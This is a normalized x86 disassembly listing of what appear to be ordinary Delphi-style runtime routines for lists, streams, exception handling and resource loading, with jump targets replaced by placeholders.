push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b7d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41f8b4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41f8bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b7dd
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41f95c
inc esi
dec ebx
jne r-xdata
sub_41b808
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41b824
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aac0
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404a50
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_41b88c
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41ae3c
jmp r-xdata
sub_41b928
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404a50
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41b968
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ae3c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4029b0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404b3c
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41b9d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ae3c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_41ae3c
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41ba30
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41ba30
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41ba54
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41bacc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ae3c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403ff0
pop edi
pop esi
pop ebx
retn
sub_41bb08
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ae3c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41bb30
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41bb64
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41b104
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41bbb0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41ae3c
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ae3c
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41bc02
mov eax eax
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41bb30
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403ff0
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4029b0
sub_41bc7c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41ae3c
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ae3c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403ff0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41bcd8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ae3c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41bd18
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ba30
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41bd18
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41bdc8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41be24
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41bd18
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41be78
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41beac
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41bf0e
mov eax eax
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41bf64
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_40319c
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
mov esp ebp
pop ebp
retn
sub_41bfae
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_403194
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41bf64
pop ecx
mov eax [ ebx ]
call sub_4031d8
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41bf64
pop ecx
sub_41c032
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41c0a4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
sub_41c0dc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
sub_41c114
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41be98
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4027b4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41c1f0
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c1f7
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4027d4
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41c0a4
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41c0dc
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41c208
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c88c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c258
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41e8c0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c25f
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
sub_41c268
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40321c
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41c2c4
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408714
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41c304
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cf60
pop ebx
pop ebp
retn 0x8
sub_41c32c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41c370
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41c370
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41c499
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403570
movzx edx di
mov eax esi
call sub_408638
mov ecx eax
xor edx edx
mov eax ebx
call sub_41c268
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_4086b4
mov ecx eax
xor edx edx
mov eax ebx
call sub_41c268
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c4a0
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403fc0
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408854
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b124
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408854
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b124
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
jmp r-xdata
sub_41c4a0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41c4c4
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
call sub_40874c
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_41c500
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4029b0
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41c538
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41c55c
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
call sub_41c588
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_41c5a0
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41be98
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41c0a4
sub_41c5d8
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41c4f8
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41c600
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41c5d8
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41c62c
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406d28
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406d0c
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406cfc
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
test ecx ecx
jne r-xdata
sub_41c6b8
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4029b0
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41c5d8
sub_41c708
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40321c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_40445c
mov ecx eax
mov edx esi
mov eax edi
call sub_41c7d0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41c760
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41c7c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c7ca
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
sub_41c7d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
